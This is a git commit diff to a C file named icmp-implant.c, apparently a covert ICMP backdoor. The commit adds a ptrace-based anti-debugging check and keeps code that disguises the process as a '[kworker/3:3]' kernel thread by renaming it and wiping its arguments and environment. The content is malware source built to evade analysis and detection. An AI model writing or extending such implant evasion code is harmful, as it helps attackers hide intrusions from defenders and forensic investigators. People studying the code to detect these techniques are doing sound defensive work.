f0eca3d7e573a62f1b2b441a611d5165eb34650b
g0rchy <92731777+g0rchy@users.noreply.github.com>
2023-01-23 22:34:43 +0100

    added a trivial anti-debugging technique

--- src/icmp-implant.c
+++ src/icmp-implant.c
@@ -1,4 +1,5 @@
 #include "../include/implant.h"
+#include <sys/ptrace.h>
 
 int main(int argc, char **argv, char **envp) {
     if (argc < 2) {
@@ -8,6 +9,11 @@ int main(int argc, char **argv, char **envp) {
 
     size_t ip_len = strlen(argv[1]);
     char target[ip_len];
+
+    // detect if a debugger is used against our implant
+    if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) {
+        return 1;
+    }
 
     strncpy(target, argv[1], ip_len);
 
@@ -20,9 +26,9 @@ int main(int argc, char **argv, char **envp) {
     // save the arg for later
     strncpy(target, argv[1], ip_len + 1);
 
-    // process masquerading, change the command name associated with the process (/proc/<pid>/comm)
-    prctl(PR_SET_NAME, "[kworker/3:3]", NULL, NULL, NULL);
-    strncpy(argv[0], "[kworker/3:3]\0", strlen(argv[0]) + 1);
+    // process masquerading, change the command name associated with the process
+    prctl(PR_SET_NAME, "[kworker/3:3]", NULL, NULL, NULL); // modifies /proc/<PID>/status
+    strncpy(argv[0], "[kworker/3:3]\0", strlen(argv[0]) + 1); // modifies /proc/<pid>/cmdline
     strncpy(argv[1], "\0", strlen(argv[1]));
 
     // kworker thread doesn't have any env variables
